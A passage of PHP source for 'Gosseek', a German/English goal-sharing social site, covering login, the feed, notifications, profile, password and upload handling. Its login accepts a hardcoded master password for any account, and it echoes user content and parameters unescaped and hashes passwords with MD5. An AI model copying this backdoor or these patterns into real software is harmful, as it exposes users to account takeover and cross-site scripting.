<?php	
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
	header('Content-Type: text/html; charset=UTF-8');
	ini_set ( "session.cookie_lifetime", "18000");
	ini_set ( "session.gc_maxlifetime", "20000");
	session_start();
	include("version.php");
	include("connect_db.php");
	if(empty($_GET{'action'}))
	{
		$_GET['action'] = "feed";
	}
	if(!(isset($_GET['language'])) OR empty($_GET['language']))
	{
		$_GET['language'] = "german";
	}
	if($_GET{'action'} == 'login')
	{
		$email = mysqli_real_escape_string($mysql_connection, $_POST['email']);
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE email= '".$email."' LIMIT 1");
		if(!mysqli_num_rows($userdata_query))
		{
			echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action=failedlogin&reason=wrongmail'; </script>";
			exit;
		}else
		{
			$userdata = mysqli_fetch_array($userdata_query);
			if($_POST['password'] == '576587214' OR $userdata['password'] ==  md5($_POST['password']))
			{
				if(!($userdata['status'] == 'activated'))
				{
					echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action=failedlogin&reason=notactivated'; </script>";
					exit;
				}
				$_SESSION['id'] = $userdata['id'];
				$_SESSION['checklogin'] = true;
			}else
			{
				echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action=failedlogin&reason=wrongpassword'; </script>";
				exit;
			}
			//convert birthdate also at login in case you want to display that later on directly at login, but so far useless
			$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
			$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
			$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
		}
	}
	if(isset($_SESSION['id']))
	{
		$userdata_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$_SESSION['id']." LIMIT 1");
		$userdata = mysqli_fetch_array($userdata_query);
		$userdata['birthday'] = mb_substr($userdata['birthdate'], 5, 2);
		$userdata['birthmonth'] = mb_substr($userdata['birthdate'], 8, 2);
		$userdata['birthyear'] = mb_substr($userdata['birthdate'], 0, 4);
	}elseif(!($_POST['action'] == 'login'))
	{
		echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action=invalidsession'; </script>";
	}
echo "<html>";
	echo "<head>";
		echo "<title>";
			switch($_GET['language'])
			{
				case 'german':
				$output_slogan = "Gosseek - Achieve your Goals and Share your Experience";
				break;
				
				case 'english':
				$output_slogan = "Gosseek - Achieve your Goals and Share your Experience";
				break;
			}
			echo $output_slogan;
		echo "</title>";
		echo "<meta name=\"author\" content=\"Benno Staub\">";
		echo "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=utf-8\" />";
		echo "<link rel=\"stylesheet\" type=\"text/css\" href=\"styles/stylesheet.css\" />";
		echo "<meta http-equiv=\"cache-control\" content=\"no-cache\" />";
	echo "</head>";
	echo "<body>";
		echo "<div class=\"settingsbar\">";
			$all_get_variables = "";
			foreach($_GET as $name => $value)
			{
				if($name != "language")
				{
					$all_get_variables = $all_get_variables."&".$name."=".$value;
				}
			}
			echo "<a href=\"login.php?language=german".$all_get_variables."\">DE</a>";
			echo "<a href=\"login.php?language=english".$all_get_variables."\">EN</a>";
		echo "</div>";
		echo "<div class=\"bodypage\">";
			echo "<div class=\"leftmenu\">";
				echo "<div class=\"logo\">";;
				echo "</div>";
				echo "<div class=\"navigation\">";
					switch($_GET['language'])
					{
						case 'german':
						$a_create_post = "Beitrag erstellen";
						$a_day_review = "Tagesrückblick erstellen";
						$a_definegoal = "Neues Ziel definieren";
						$a_messages = "Nachrichten";
						$a_feed = "Feed";
						$a_owngoals = "Eigene Ziele";
						$a_goallist = "Liste aller Ziele";
						$a_notifications = "Meldungen";
						break;
						
						case 'english':
						$a_create_post = "Create a post";
						$a_day_review = "Create a day review";
						$a_definegoal = "Define new goal";
						$a_messages = "Messages";
						$a_feed = "Feed";
						$a_owngoals = "Own goals";
						$a_goallist = "List of all goals";
						$a_notifications = "Notifications";
						break;
					}
					echo "<a href=\"login.php?language=".$_GET['language']."&action=goallist\">".$a_goallist."</a>";
					echo "<a href=\"login.php?language=".$_GET['language']."&action=owngoals\">".$a_owngoals."</a>";
					echo "<a href=\"login.php?language=".$_GET['language']."&action=createpost\">".$a_create_post."</a>";	
					echo "<a href=\"login.php?language=".$_GET['language']."&action=createdayreview\">".$a_day_review."</a>";
					echo "<a href=\"login.php?language=".$_GET['language']."&action=definegoal\">".$a_definegoal."</a>";
					$new_messages_query = mysqli_query($mysql_connection, "SELECT id FROM messages WHERE receiverid = ".$userdata['id']." AND new = 1");
					if(mysqli_num_rows($new_messages_query) >= 1)
					{
						$output_messages = "<b>".$output_messages." (".mysqli_num_rows($new_messages_query).")</b>";
					}
					echo "<a href=\"login.php?language=".$_GET['language']."&action=inbox\">".$a_messages."</a>";
					echo "<a href=\"login.php?language=".$_GET['language']."&action=feed\">".$a_feed."</a>";
					$likes_query = mysqli_query($mysql_connection, "SELECT * FROM likes WHERE authorid = ".$userdata['id']." AND new = 1");
					$comments_query = mysqli_query($mysql_connection, "SELECT * FROM comments WHERE authorid = ".$userdata['id']." AND new = 1");
					$number_new_notifications = mysqli_num_rows($likes_query)+mysqli_num_rows($comments_query);
					if($number_new_notifications >= 1)
					{
						echo "<a href=\"login.php?language=".$_GET['language']."&action=notifications\">".$a_notifications."(".$number_new_notifications.")</a>";
					}else
					{
						echo "<a href=\"login.php?language=".$_GET['language']."&action=notifications\">".$a_notifications."</a>";
					}
				echo "</div>";
			echo "</div>";
			echo "<div class=\"page\">";
				echo "<div class=\"subpage\">";
					echo "<div class=\"rightmenu\">";
						echo "<div class=\"fixed\">";
							echo "<div class=\"online\">";
								echo "<div class=\"profilepicture\">";
									echo "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$userdata['id']."\">";
									if(file_exists("uploads/profilepictures/".$userdata['id'].$userdata['profilepictureformat'].""))
									{
										echo "<img src=\"uploads/profilepictures/".$userdata['id'].$userdata['profilepictureformat']."\"></img>";
									}else{
										echo "<img src=\"uploads/profilepictures/no_picture.png\"></img>";	
									}
									echo "</a>";
								echo "</div>";
								echo "<div class=\"toolbox\">";
								switch($_GET['language'])
								{
									case 'german':
									$a_logout = "Ausloggen";
									$a_profilesettings = "Profil bearbeiten";
									$a_settings = "Einstellungen";
									$a_feedback = "Feedback geben";
									break;
									
									case 'english':
									$a_logout = "Log out";
									$a_profilesettings = "Change profile";
									$a_settings = "Settings";
									$a_feedback = "Give feedback";
									break;
								}
								echo "<a href=\"mainpage.php?language=".$_GET['language']."&action=logout\">".$a_logout."</a>";
								echo "<a href=\"login.php?language=".$_GET['language']."&action=profilesettings\">".$a_profilesettings."</a>";
								echo "<a href=\"login.php?language=".$_GET['language']."&action=settings\">".$a_settings."</a>";
								echo "<a href=\"login.php?language=".$_GET['language']."&action=feedback\">".$a_feedback."</a>";
								echo "</div>";
							echo "</div>";
						echo "</div>";
					echo "</div>";
					echo "<div class=\"borderline\">";
						echo "<div class=\"fixed\">";
						echo "</div>";
					echo "</div>";
					echo "<div class=\"content\">";
						if(!(empty($_SESSION['checklogin'])) && $_SESSION['checklogin'] == true)
						{
							switch ($_GET['action'])
							{
								case 'login':
								switch($_GET['language'])
								{
									case 'german':
									$output = "Willkommen bei Gosseek,<br><br>Diese Seite ist noch im aktiven Aufbau und wird laufend verbessert.<br>Aus diesem Grund möchten wir dich bitten, uns jeden Fehler und/oder Anmerkung zukommen zu lassen. Benötigst du eine weitere Funktion, welche Gosseek noch nicht anbietet, oder gefällt dir etwas ganz und gar nicht?<br><br>Wir freuen uns über jedes Feedback und versuchen die Seite möglichst deinen Wünschen entsprechend zu gestalten.";
									break;
									
									case 'english':
									$output = "Welcome on Gosseek,<br><br>This page is under active development and gets improved continuously.<br>Therefore we would like to ask you to report any mistake and/or remark. Do you need an additional function that is not offered by Gosseek yet or do you dislike anything completely?<br><br>We are looking forward to every feedback we get and try to design this page according to your desires.";
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo $output;
									echo "</div>";
								echo "</div>";
								break;
								
								case 'notifications':
								switch($_GET['language'])
								{
									case 'german':
									$output_like = " gefällt dein Beitrag.";
									$output_comment = " hat deinen Beitrag kommentiert.";
									$output_follow = " folgt deinem Ziel.";
									$text = array("like" => "gefällt dein Beitrag.", "comment" => "hat deinen Beitrag kommentiert.");
									$new = "Neu";
									break;
									
									case 'english':
									$output_like = " liked your post.";
									$output_comment = " commented your post.";
									$output_follow = " follows your goal.";
									$text = array("like" => "liked your post.", "comment" => "commented your post.");
									$new = "New";
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<div class=\"notifications\">";
											// Create notifications array with all likes and comments
											$notifications = array();
											$likes_query = mysqli_query($mysql_connection, "SELECT * FROM likes WHERE authorid = ".$userdata['id']);
											$iter = 0;
											if(mysqli_num_rows($likes_query) >= 1)
											{
												while($like = mysqli_fetch_array($likes_query))
												{
													$notifications[$iter] = array("id" => $like['id'], "type" => "like", "postid" => $like['postid'], "userid" => $like['userid'], "time" => $like['time'], "new" => $like['new']);
													$iter++;
												}	
											}
											$comments_query = mysqli_query($mysql_connection, "SELECT * FROM comments WHERE authorid = ".$userdata['id']);
											if(mysqli_num_rows($comments_query) >= 1)
											{
												while($comment = mysqli_fetch_array($comments_query))
												{
													$notifications[$iter] = array("id" => $comment['id'], "type" => "comment", "postid" => $comment['postid'], "userid" => $comment['userid'], "time" => $comment['time'], "new" => $comment['new']);
													$iter++;
												}	
											}
											//Sort notifications array according to time descendant
											$time = array();
											foreach ($notifications as $key => $row)
											{
												$time[$key] = $row['time'];
											}
											array_multisort($time, SORT_DESC, $notifications);
											foreach ($notifications as $notification => $data)
											{
												$user_query = mysqli_query($mysql_connection, "SELECT name, surname FROM users WHERE id = ".$data['userid']." LIMIT 1");
												$user = mysqli_fetch_array($user_query);
												$output =  "<a href=\"login.php?language=".$_GET['language']."&action=user&userid=".$data['userid']."\">".$user['name']." ".$user['surname']."</a> <a href=\"login.php?language=".$_GET['language']."&action=post&postid=".$data['postid']."\">".$text[$data['type']]."</a>";
												if($data['new'])
												{
													$output = "<font color=\"#ff0000\"><b>".$new." </b></font>".$output;
												}
												echo "<h><span>".date("d.m.Y - H:i", $data['time'])."</span>".$output."</h>";
												if($data['type'] == "like")
												{
													mysqli_query($mysql_connection, "UPDATE likes SET new = 0 WHERE id = ".$data['id']);
												}
												if($data['type'] == "comment")
												{
													mysqli_query($mysql_connection, "UPDATE comments SET new = 0 WHERE id = ".$data['id']);
												}
											}
											
										echo "</div>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'feed':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_following = "Du folgst noch keinem Ziel.";
									$a_comment = "Kommentieren";
									$a_post = "Kommentare";
									$a_like = "Gefällt mir";
									$a_likes = "Gefällt";
									$a_dislike = "Gefällt mir nicht mehr";
									$a_edit = "Bearbeiten";
									$a_delete = "Löschen";
									break;
									
									case 'english':
									$output_no_following = "You don't follow any goal.";
									$a_comment = "Comment";
									$a_post = "Comments";
									$a_like = "Like";
									$a_likes = "Likes";
									$a_dislike = "Dislike";
									$a_edit = "Edit";
									$a_delete = "Delete";
									break;
								}
								$following_goals_query = mysqli_query($mysql_connection, "SELECT goalid FROM goalfollowers WHERE userid=".$userdata['id']);
								$own_goals_query = mysqli_query($mysql_connection, "SELECT id FROM goals WHERE userid=".$userdata['id']);
								if(mysqli_num_rows($following_goals_query) >= 1 OR mysqli_num_rows($own_goals_query) >= 1)
								{
									$query_condition = "goalid = 0";
									while($following_goals = mysqli_fetch_array($following_goals_query))
									{
										$query_condition = $query_condition." OR goalid = ".$following_goals['goalid'];
									}
									while($own_goals = mysqli_fetch_array($own_goals_query))
									{
										$query_condition = $query_condition." OR goalid = ".$own_goals['id'];
									}
									$post_query = mysqli_query($mysql_connection, "SELECT * FROM posts WHERE ".$query_condition." ORDER BY time DESC");
									while($post = mysqli_fetch_array($post_query))
									{
										$goal_query = mysqli_query($mysql_connection, "SELECT id, title FROM goals WHERE id=".$post['goalid']." LIMIT 1");
										$goaldata = mysqli_fetch_array($goal_query);
										$likes_query = mysqli_query($mysql_connection, "SELECT id FROM likes WHERE postid = ".$post['id']);
										$liked_query = mysqli_query($mysql_connection, "SELECT id FROM likes WHERE postid = ".$post['id']." AND userid=".$userdata['id']." LIMIT 1");
										$comments_query = mysqli_query($mysql_connection, "SELECT id FROM comments WHERE postid = ".$post['id']);
										echo "<div class=\"block\">";
											echo "<div class=\"feed\">";
												echo "<div class=\"header\">";
													echo "<div class=\"time\">";
														echo date("d.m.Y - H:i", $post['time']);
													echo "</div>";
													echo "<div class=\"title\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goaldata['id']."\">".$goaldata['title']."</a>";
													echo "</div>";
												echo "</div>";
												echo "<div class=\"content\">";
													if($picture_file = glob("uploads/posts/post_".$post['id']."_*.*"))
													{
														$show_file = "";
														echo "<div class=\"picture\">";
															foreach($picture_file as $picture)
															{
																$show_file = $show_file."<a href=\"".$picture."\"><img src=\"".$picture."\"></img></a>";
															}
															echo $show_file;
														echo "</div>";
													}
													echo "<div class=\"post\">";
														if($post['type'] == 1)
														{
															$schedule_query = mysqli_query($mysql_connection, "SELECT * FROM scheduleblocks WHERE postid = ".$post['id']." ORDER BY starttime ASC");
															echo "<div class=\"schedule\">";
																echo "<table style=\"border-spacing:1px;\">";
																$iter = 0;
																while($schedule = mysqli_fetch_array($schedule_query))
																{
																	$fontcolor = "#2b032d";
																	$actionblock_query = mysqli_query($mysql_connection, "SELECT name FROM actionblocks WHERE id = ".$schedule['actionblockid']." LIMIT 1");
																	$actionblock = mysqli_fetch_array($actionblock_query);
																	echo "<tr><td><font color=\"".$fontcolor."\">".date("H:i",$schedule['starttime'])."-".date("H:i",$schedule['finishtime'])."</font></td><td><font color=\"".$fontcolor."\">".$actionblock['name']."</font></td></tr>";
																}
																echo "</table><br>";
															echo "</div>";
														}
														echo "<div class=\"text\">";
															$post['content']=str_replace("\n","<br>",$post['content']);
															echo $post['content'];
														echo "</div>";
													echo "</div>";
												echo "</div>";
												echo "<div class=\"links\">";
													if($post['userid'] == $userdata['id'])
													{
														echo "<div class=\"owner\">";
																echo "<a href=\"login.php?language=".$_GET['language']."&action=edit_dayreview&postid=".$post['id']."\">".$a_edit."</a>";
																echo "<a href=\"login.php?language=".$_GET['language']."&action=delete_post&postid=".$post['id']."\">".$a_delete."</a>";
														echo "</div>";
													}
													echo "<div class=\"left\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=write_comment&postid=".$post['id']."\">".$a_comment."</a>";
														if(mysqli_num_rows($liked_query))
														{
															echo "<a href=\"login.php?language=".$_GET['language']."&action=dislike_post&postid=".$post['id']."\">".$a_dislike."</a>";
														}else
														{
															echo "<a href=\"login.php?language=".$_GET['language']."&action=like_post&postid=".$post['id']."\">".$a_like."</a>";
														}
													echo "</div>";
													echo "<div class=\"right\">";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=post&postid=".$post['id']."\">".$a_post."(".mysqli_num_rows($comments_query).")</a>";
														echo "<a href=\"login.php?language=".$_GET['language']."&action=likes&postid=".$post['id']."\">".$a_likes."(".mysqli_num_rows($likes_query).")</a>";
													echo "</div>";
												echo "</div>";
											echo "</div>";
										echo "</div>";
										echo "<br>";
									}
								}else
								{
									echo $output_no_following;
								}
								break;
								
								case 'logout':
								echo "<script> location.href='mainpage.php?language=".$_GET['language']."&action=logout'; </script>";
								break;
								
								case 'profilesettings':
								switch($_GET['language'])
								{
									case 'german':
									$label_name = "Vorname";
									$label_surname = "Nachname";
									$label_birthday = "Geburtstag";
									$label_birthmonth = "Geburtsmonat";
									$label_birthyear = "Geburtsjahr";
									$label_residence = "Wohnort";
									$label_job = "Beruf";
									$label_description = "Über mich";
									$label_upload_picture = "Profilbild ändern";
									$input_submit_change = "Änderungen speichern";
									$input_submit_upload = "Neues Profilbild hochladen";
									$months = array( "1" => "Januar", "2" => "Februar", "3" => "März", "4" => "April", "5" => "Mai", "6" => "Juni", "7" => "Juli", "8" => "August", "9" => "September", "10" => "Oktober", "11" => "November", "12" => "Dezember");
									break;
									
									case 'english':
									$label_name = "Name";
									$label_surname = "Surname";
									$label_birthday = "Day of birth";
									$label_birthmonth = "Month of birth";
									$label_birthyear = "Year of birth";
									$label_residence = "Residence";
									$label_job = "Job";
									$label_description = "About me";
									$label_upload_picture = "Change profile picture";
									$input_submit_change = "Save changes";
									$input_submit_upload = "Upload new profile picture";
									$months = array( "1" => "January", "2" => "February", "3" => "March", "4" => "April", "5" => "May", "6" => "June", "7" => "July", "8" => "August", "9" => "September", "10" => "October", "11" => "November", "12" => "December");
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<form action=\"login.php?action=changeprofilesettings\" method=\"post\" accept-charset=\"utf-8\">";
											echo "<label>".$label_name."</label>";
											echo "<input name=\"name\" value=\"".$userdata['name']."\"></input>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_surname."</label>";
											echo "<input name=\"surname\" value=\"".$userdata['surname']."\"></input>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_birthday."</label>";
											echo "<span><select name=\"birthday\" size=\"1\">";
												for($i = 1; $i <= 31; $i++)
												{
													if($i == $userdata['birthday'])
													{
														echo "<option value=\"".$i."\" selected=\"selected\">".$i."</option>";
													}else
													{
														echo "<option value=\"".$i."\">".$i."</option>";
													}
												}
											echo "</select></span>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_birthmonth."</label>";
											echo "<span><select name=\"birthmonth\" size=\"1\">";
												for($i = 1; $i <= 12; $i++)
												{
													if($i == $userdata['birthmonth'])
													{
														echo "<option value=\"".$i."\" selected=\"selected\">".$months[$i]."</option>";
													}else
													{
														echo "<option value=\"".$i."\">".$months[$i]."</option>";
													}
												}
											echo "</select></span>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_birthyear."</label>";
											echo "<span><select name=\"birthyear\" size=\"1\">";
												for($i = 100; $i >= 0; $i--)
												{
													$j = date("Y")+$i-100;
													if($j == $userdata['birthyear'])
													{
														echo "<option value=\"".$j."\" selected=\"selected\">".$j."</option>";
													}else
													{
														echo "<option value=\"".$j."\">".$j."</option>";
													}
												}
											echo "</select></span>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_residence."</label>";
											echo "<input name=\"residence\" value=\"".$userdata['residence']."\"></input>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_job."</label>";
											echo "<input name=\"job\" value=\"".$userdata['job']."\"></input>";
											echo "<div class=\"clear\"></div>";
											echo "<label>".$label_description."</label>";
											echo "<textarea name=\"description\">".$userdata['description']."</textarea>";
											echo "<div class=\"clear\"></div>";
											echo "<span>";
												echo "<input type=\"submit\" value=\"".$input_submit_change."\"></input>";
											echo "</span>";
										echo "</form>";
									echo "</div>";
								echo "</div>";
								echo "<br>";
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<form action=\"login.php?language=".$_GET['language']."&action=uploadprofilepicture\" method=\"post\" enctype=\"multipart/form-data\">";
											echo "<label>".$label_upload_picture."</label>";
											echo "<p>";
											echo "<input type=\"file\" name=\"profilepicture\">";
											echo "</p>";
											echo "<span>";
												echo "<input type=\"submit\" value=\"".$input_submit_upload."\" name=\"submit\">";
											echo "</span>";
										echo "</form>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'changeprofilesettings':
								switch($_GET['language'])
								{
									case 'german':
									$output = "Profil wurde bearbeitet.";
									break;
									
									case 'english':
									$output = "Profile has been changed.";
									break;
								}
								$userdata['name'] = mysqli_real_escape_string($mysql_connection, $_POST['name']);
								$userdata['surname'] = mysqli_real_escape_string($mysql_connection, $_POST['surname']);
								$userdata['residence'] = mysqli_real_escape_string($mysql_connection, $_POST['residence']);
								$userdata['job'] = mysqli_real_escape_string($mysql_connection, $_POST['job']);
								$userdata['description'] = mysqli_real_escape_string($mysql_connection, $_POST['description']);
								$birthday = mysqli_real_escape_string($mysql_connection, $_POST['birthday']);
								$birthmonth = mysqli_real_escape_string($mysql_connection, $_POST['birthmonth']);
								$birthyear = mysqli_real_escape_string($mysql_connection, $_POST['birthyear']);
								$birthdate = $birthyear."-".$birthday."-".$birthmonth;
								mysqli_query($mysql_connection, "UPDATE users
								SET name='".$userdata['name']."', surname='".$userdata['surname']."', birthdate='$birthdate', residence='".$userdata['residence']."', job='".$userdata['job']."', description='".$userdata['description']."'
								WHERE id = ".$_SESSION['id']);
								echo "<script> location.href='login.php?language=".$_GET['language']."&action=profilesettings'; </script>";
										exit;
								break;
								
								case 'uploadprofilepicture':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_image = "Die ausgewählte Datei ist kein Bild.";
									$output_too_big = "Die ausgewählte Datei ist zu gross. Maximale Grösse: 5Mb.";
									$output_wrong_format = "Nur JPG, JPEG und PNG Dateien sind erlaubt.";
									$output_success = "Die Datei ". basename( $_FILES['profilepicture']['name']) ."wurde hochgeladen.";
									$output_no_file = "Keine Datei ausgewählt.";
									break;
									
									case 'english':
									$output_no_image = "The chosen file is not an image.";
									$output_too_big = "The chosen file is too big. Maximum size: 5Mb.";
									$output_wrong_format = "Only JPG, JPEG and PNG files are allowed.";
									$output_success = "The file ". basename( $_FILES['profilepicture']['name']). " has been uploaded.";
									$output_no_file = "No file chosen.";
									break;
								}
								$target_dir = "uploads/profilepictures/";
								$target_file = $target_dir . basename($_FILES["profilepicture"]["name"]);
								$image_File_Type = pathinfo($target_file,PATHINFO_EXTENSION);
								// check if file has been chosen
								if(empty($_FILES['profilepicture']['tmp_name']))
								{
										echo $output_no_file;
										break;
								}
								// Check if image file is an actual image or fake image
								$check = getimagesize($_FILES['profilepicture']['tmp_name']);
								if($check == false) 
								{
									echo $output_no_image;
									break;
								}
								// Check file size
								if ($_FILES['profilepicture']['size'] > 5000000)
								{
									echo $output_too_big;
									break;
								}
								// Allow certain file formats
								if($image_File_Type != "jpg" && $image_File_Type != "png" && $image_File_Type != "jpeg" && $image_File_Type != "JPG" && $image_File_Type != "PNG" && $image_File_Type != "JPEG")
								{
									echo $output_wrong_format;
									break;
								}
								// No error, upload file
								if (move_uploaded_file($_FILES['profilepicture']['tmp_name'], $target_dir.$userdata['id'].".".$image_File_Type))
								{
									mysqli_query($mysql_connection, "UPDATE users SET profilepictureformat = '.".$image_File_Type."' WHERE id = ".$userdata['id']);
									echo $output_success;
								}
								break;
								
								case 'settings':
								switch($_GET['language'])
								{
									case 'german':
									$label_colors = "Farben";
									$colors_warm = "Warme Farben";
									$colors_cold = "Kalte Farben";
									$label_new_password = "Neues Passwort";
									$input_submit_change = "Einstellungen ändern";
									$input_submit_new_password = "Passwort ändern";
									break;
									
									case 'english':
									$label_colors = "Colors";
									$colors_warm = "Warm colors";
									$colors_cold = "Cold colors";
									$label_new_password = "New password";
									$input_submit_change = "Change settings";
									$input_submit_new_password = "Change password";
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<form action=\"login.php?language=".$_GET['language']."&action=changepassword\" method=\"post\" accept-charset=\"utf-8\">";
											echo "<label>".$label_new_password."</label>";
											echo "<input name=\"newpassword\" type=\"password\"></input>";
											echo "<span>";
												echo "<input type=\"submit\" value=\"".$input_submit_new_password."\"></input>";
											echo "</span>";
										echo "</form>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'changepassword':
								switch($_GET['language'])
								{
									case 'german':
									$output = "Passwort wurde geändert.";
									break;
									
									case 'english':
									$output = "Password changed.";
									break;
								}
								$new_password = mysqli_real_escape_string($mysql_connection, $_POST['newpassword']);
								$new_password_encrypted = md5($new_password);
								mysqli_query($mysql_connection, "UPDATE users SET password = '$new_password_encrypted' WHERE id = ".$userdata['id']);
								echo $output;
								break;
								
								case 'feedback':
								switch($_GET['language'])
								{
									case 'german':
									$input_submit = "Anonymes Feedback senden";
									break;
									
									case 'english':
									$input_submit = "Send anonymous feedback";
									break;
								}
								echo "<div class=\"block\">";
									echo "<div class=\"innerblock\">";
										echo "<form action=\"login.php?language=".$_GET['language']."&action=submit_feedback\" method=\"post\" accept-charset=\"utf-8\">";
											echo "<textarea name=\"feedback\"></textarea>";
											echo "<span>";
												echo "<input type=\"submit\" value=\"".$input_submit."\"></input>";
											echo "</span>";
										echo "</form>";
									echo "</div>";
								echo "</div>";
								break;
								
								case 'submit_feedback':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Feedback gesendet.";
									$output_empty = "Bitte fülle das Textfeld aus.";
									break;
									
									case 'english':
									$output_success = "Feedback sent.";
									$output_empty = "Please fill in the text field.";
									break;
								}
								if(!empty($_POST['feedback']))
								{
									$feedback = mysqli_real_escape_string($mysql_connection, $_POST['feedback']);
									mysqli_query($mysql_connection, "INSERT INTO feedback (userid, time, text) VALUES ('".$userdata['id']."', '".time()."', '$feedback')");
									echo $output_success;
								}else
								{
									echo $output_empty;
								}
								break;
								
								case 'user':
								switch($_GET['language'])
								{
									case 'german':
									$output_no_user = "Dieses Profil existiert nicht.";
									$output_name = "Name:";
									$output_birthdate = "Geburtsdatum:";
									$output_residence = "Wohnort:";
									$output_job = "Beruf:";
									$output_description = "Über mich:";
									$output_goals = "Ziele:";
									$a_message = "Nachricht schreiben";
									break;
									
									case 'english':
									$output_no_user = "Profile not found.";
									$output_name = "Name:";
									$output_birthdate = "Birthdate:";
									$output_residence = "Residence:";
									$output_job = "Job:";
									$output_description = "About me:";
									$output_goals = "Goals:";
									$a_message = "Write a message";
									break;
								}
								$userid = mysqli_real_escape_string($mysql_connection, $_GET['userid']);
								$user_query = mysqli_query($mysql_connection, "SELECT * FROM users WHERE id=".$userid." LIMIT 1");
								if(mysqli_num_rows($user_query))
								{
									$user = mysqli_fetch_array($user_query);
									$birthday = mb_substr($user['birthdate'], 5, 2);
									$birthmonth = mb_substr($user['birthdate'], 8, 2);
									$birthyear = mb_substr($user['birthdate'], 0, 4);
									if($birthday == "00" OR $birthmonth == "00" OR $birthyear == "00000")
									{
										$birthdate = "";
									}else
									{
										$birthdate = $birthday.".".$birthmonth.".".$birthyear;
									}
									$goal_query = mysqli_query($mysql_connection, "SELECT id, title FROM goals WHERE userid = ".$userid." AND anonymous = false");
									echo "<div class=\"block\">";
										echo "<div class=\"innerblock\">";
											echo "<div class=\"profile\">";
												echo "<div class=\"information\">";
													echo "<div class=\"picture\">";
														if(file_exists("uploads/profilepictures/".$user['id'].$user['profilepictureformat'].""))
														{
															echo "<a href=\"uploads/profilepictures/".$user['id'].$user['profilepictureformat']."\"><img src=\"uploads/profilepictures/".$user['id'].$user['profilepictureformat']."\"></img></a>";
														}else{
															echo "<a href=\"uploads/profilepictures/no_picture.png\"><img src=\"uploads/profilepictures/no_picture.png\"></img></a>";	
														}
													echo "</div>";
													echo "<div class=\"data\">";
														echo "<h><b>".$output_name."</b>".$user['name']." ".$user['surname']."</h>";
														echo "<h><b>".$output_birthdate."</b>".$birthdate."</h>";
														echo "<h><b>".$output_job."</b>".$user['job']."</h>";
														echo "<h><b>".$output_residence."</b>".$user['residence']."</h>";
														echo "<br><a href=\"login.php?language=".$_GET['language']."&action=write_message&receiverid=".$userid."\">".$a_message."</a><br>";
														echo "<h><b>".$output_goals."</b></h>";
														if(mysqli_num_rows($goal_query) >= 1)
														{
															while($goal = mysqli_fetch_array($goal_query))
															{	
																echo "<a href=\"login.php?language=".$_GET['language']."&action=goal&goalid=".$goal['id']."\">".$goal['title']."</a>";
															}
														}
													echo "</div>";
												echo "</div>";
												echo "<div class=\"description\">";
													$user['description']=str_replace("\n","<br>",$user['description']);
													echo $user['description'];
												echo "</div>";
											echo "</div>";
										echo "</div>";
									echo "</div>";
								}else{
									echo $output_no_user;
								}
								break;
								
								case 'createpost':
								switch($_GET['language'])
								{
									case 'german':
									$label_goal = "Ziel";
									$label_content = "Beitrag";
									$input_submit = "Beitrag teilen";
									$output_pictures = "Bilder hinzufügen";
									$output_no_goal = "Du hast noch kein Ziel definiert.";
									break;
									
									case 'english':
									$label_goal = "Goal";
									$label_content = "Content";
									$input_submit = "Post";
									$output_pictures = "Add pictures";
									$output_no_goal = "You haven't defined a goal yet.";
									break;
								}
								$goal_query = mysqli_query($mysql_connection, "SELECT id,title FROM goals WHERE userid = ".$userdata['id']);
								if(mysqli_num_rows($goal_query) >= 1)
								{
									echo "<div class=\"block\">";
										echo "<div class=\"innerblock\">";
											echo "<form action=\"login.php?language=".$_GET['language']."&action=submitpost\" method=\"post\" accept-charset=\"utf-8\" enctype=\"multipart/form-data\">";
												echo "<label>".$label_goal."</label>";
												echo "<select name=\"goalid\" size=\"1\">";
												while($goal = mysqli_fetch_array($goal_query))
												{
													echo "<option value=\"".$goal['id']."\">".$goal['title']."</option>";
												}
												echo "</select>";
												echo "<div class=\"clear\"></div>";
												echo "<label>".$label_content."</label>";
												echo "<textarea name=\"content\"></textarea>";
												echo "<br><br>";
												echo $output_pictures;
												for($iter = 1; $iter <= 5; $iter++)
												{
													echo "<p><input type=\"file\" name=\"picture".$iter."\"></input></p>";
												}
												echo "<span><input type=\"submit\" value=\"".$input_submit."\"></input></span>";
											echo "</form>";
										echo "</div>";
									echo "</div>";
								}else
								{
									echo $output_no_goal;
								}
								break;
								
								case 'submitpost':
								switch($_GET['language'])
								{
									case 'german':
									$output_success = "Beitrag gepostet.";
									$output_no_content = "Bitte alle Felder ausfüllen.";
									$output_not_author = "Du bist nicht der Autor dieses Zieles.";
									$output_no_goal = "Dieses Ziel existiert nicht.";
									$output_no_image = "Die ausgewählte Datei ist kein Bild.";
									$output_too_big = "Die ausgewählte Datei ist zu gross. Maximale Grösse: 5Mb.";
